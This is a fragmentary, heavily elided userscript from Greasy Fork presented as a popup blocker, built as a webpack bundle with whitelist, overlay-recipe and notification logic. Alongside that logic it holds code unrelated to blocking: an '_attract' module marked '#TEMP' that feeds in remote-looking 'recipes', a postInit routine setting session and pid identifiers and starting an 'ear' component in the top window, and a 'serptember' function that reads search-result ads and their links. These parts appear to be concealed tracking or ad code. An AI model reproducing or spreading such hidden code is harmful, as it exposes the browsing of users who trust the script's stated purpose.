// ==UserScript==
// @name         Popup Blocker Script(备份)
// @name:zh-CN   弹窗阻止程序脚本(备份)
...
// @downloadURL https://update.greasyfork.org/scripts/395170/Popup%20Blocker%20Script%28%E5%A4%87%E4%BB%BD%29.user.js
// @updateURL https://update.greasyfork.org/scripts/395170/Popup%20Blocker%20Script%28%E5%A4%87%E4%BB%BD%29.meta.js
// ==/UserScript==
const LANG = {
    EN: {
        "notificationMessage": {
...
/***/ (function(module, exports, __webpack_require__) {
	...
	var _attract = __webpack_require__(10);
	...
	(function ($) {
	  ...
	  var notification = new _notification2.default({
	    onDisplay: function onDisplay(_ref) {
	    ...
	    onCloseClick: function onCloseClick(_ref2) {
	      var source = _ref2.source;

	      switch (source) {
	        case 'popup-blocked':
	          //sendGoogleAnalyticsEvent({category: 'Notification_bar', action: 'Click', label: 'Close', domain: document.domain });
	          break;
	    ...
	    onButtonClick: function onButtonClick(_ref3) {
	  ...
	  var overlayKiller = new _overlayKiller2.default({
	    onRecipeFound: function onRecipeFound(_ref4) {
	  ...
	  var receivedRecipes = function receivedRecipes(data) {
	    var recepies = (data || {}).recipes || [];
	    ...
	    notification.show({
	      ...
	      buttons: {
	        ...
	        allowAlways: function allowAlways() {
	          _storage2.default.get('pb_whitelist').then(function () {
	            var whitelist = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : [];

	            whitelist.push(domain);

	            _storage2.default.set('pb_whitelist', whitelist);
	          });
	  ...
	  function initBlockFunctions() {
	    _storage2.default.get('pb_whitelist', 'pb_overlaylist', 'pb_popupBlackList').then(function (settings) {
	      ...
	      var whitelist = settings.pb_whitelist.concat(_const2.default.defaultWhiteList);
	  ...
	  _storage2.default.get('pb_whitelist').then(function () {
	    var whitelist = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : [];
	    //get whitelist
	    whitelist = whitelist.concat(_const2.default.defaultWhiteList);
	  ...
	  //#TEMP
	  (function () {
	    (0, _attract2.default)(function (d) {
	      /*console.log(typeof d, d);*/receivedRecipes(d);
	    });
	  })();
...
/***/ (function(module, exports, __webpack_require__) {
	...
	var _Promise = typeof Promise === 'undefined' ? __webpack_require__(!(function webpackMissingModule() { var e = new Error("Cannot find module \"es6-promise\""); e.code = 'MODULE_NOT_FOUND'; throw e; }())).Promise : Promise;
	...
	var OverlayKiller = function (_OverlayDectector) {
	  ...
	  function OverlayKiller() {
	    ...
	    var _this = _possibleConstructorReturn(this, (OverlayKiller.__proto__ || Object.getPrototypeOf(OverlayKiller)).call(this));

	    _this.activeBlockList = [];
	    _this.activeRecepiesList = [];

	    _this.onAutoDetect = props.onAutoDetect || function () {};
	    _this.onUserRemove = props.onUserRemove || function () {};
	    _this.onBlockListFound = props.onBlockListFound || function () {};
	    _this.onRecipeFound = props.onRecipeFound || function () {};
	    _this.onRecipeNotFound = props.onRecipeNotFound || function () {};

	    _this.blackListPromise = _this.createBlockListFromStorage();
	  ...
	  _createClass(OverlayKiller, [{
	    ...
	    value: function hide(recepies) {
	      ...
	      recepies.forEach(function (recipe) {
	        _this2.last.push(_this2.hideByRecipe(recipe));
	      });
	    }
	  }, {
	    key: 'restore',
	    ...
	    value: function addToLocalBlacklist() {
	      ...
	      PBStorageSync.pb_overlayBlockedList.update(function () {
	        ...
	        blocks.push({
	          ...
	          url: url,
	          domain: domain,
	          recipe: _this3.last.map(function (item) {
	            return item.recipe;
	          }).join(', ')
	        });
	    ...
	    value: function removeFromLocalBlacklist() {
	      ...
	      PBStorageSync.pb_overlayBlockedList.update(function () {
	        ...
	        var blocks = list[domain] || [];
	        var lastRecepies = _this4.last.map(function (item) {
	          return item.recipe;
	        });
	    ...
	    value: function createBlockListFromStorage() {
	      ...
	      return new _Promise(function (resolve) {
	        _storage2.default.get('pb_overlayBlockedList').then(function () {
	          var list = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : {};

	          if (list[document.domain]) {
	            _this6.activeBlockList = list[document.domain];

	            _this6.createBlockCSS(_this6.activeBlockList);
	          }
	    ...
	    value: function createBlockListFromRecepies(recepies) {
	      ...
	      this.blackListPromise.then(function () {
	        var blockList = _this7.activeBlockList.map(function (item) {
	          return item.recipe;
	        });
	        ...
	        _this7.activeRecepiesList = recepies;

	        _this7.createBlockCSS(recepies);
	      });
	    }
...
/***/ (function(module, exports, __webpack_require__) {
	...
	var Storage = {
	    get: function get() {
	        ...
	        return new _Promise(function (resolve) {
	            var items = [].concat(Array.prototype.slice.call(_arguments));

	            if (items.length == 1) {
	                resolve(GM_getValue(items[0]));
	            } else {
	                var data = {};
	...
	var NtfShowManager = function () {
	  ...
	  _createClass(NtfShowManager, [{
	    ...
	    value: function isShow() {
	      ...
	      return new _Promise(function (resolve) {
	        _storage2.default.get('pb_hideNotifications', 'doNotShowNotifyList', 'pb_lastNotificationDisplay').then(function (settings) {
	          var isGlobalHidden = settings.pb_hideNotifications || false;
	    ...
	    value: function updateLastDisplay(_ref3) {
	      ...
	      _storage2.default.get('pb_lastNotificationDisplay').then(function () {
	        ...
	        _storage2.default.set('pb_lastNotificationDisplay', display);
	      });
	    }
	  }, {
	    key: 'updateDontShow',
	    value: function updateDontShow(_ref4) {
	      ...
	      PBStorageSync.doNotShowNotifyList.update(function (doNotShowList) {
	  ...
	  _createClass(Notification, [{
	    ...
	    value: function getIframeData() {
	      var data = {
	        ...
	        buttons: Object.keys(this.options.buttons || {}).map(function (id) {
	          return { id: id, label: (0, _utils.getI18N)(id) };
	        }),
	      ...
	      var html = this.notificationHTML.replace('//@DATA', encodeURIComponent(JSON.stringify(data)));
...
/***/ (function(module, exports) {
	...
	function getI18N(msgName, alternative) {
	  var lang = navigator.language.toLowerCase() == 'zh-cn' ? 'CN' : 'EN';

	  return (LANG[lang][msgName] || LANG[lang][alternative] || { "message": msgName }).message;
	}
	...
	function postInit(gback) {
	    ...
	    var Source = function () {
	        ...
	        function Source() {
	            ...
	            if (this.global.ses) {
	                this.global.pid = this.global.ses;
	            }
	        }
	    ...
	    var run = function run() {
	        ...
	        var delay = false,
	            delay = delay ? new Date().getTime() - s > 183600000 : false;
	        !delay && !function () {
	            window == window.parent && ear.init();
	        }();
	    };
	    ...
	    function serptember() {
	        ...
	        function serpAd(singleAd, index) {
	            ...
	            href = singleAd.querySelectorAll("cite")[0].innerText;
	            return { title: title, href: href, index: index };
	        }
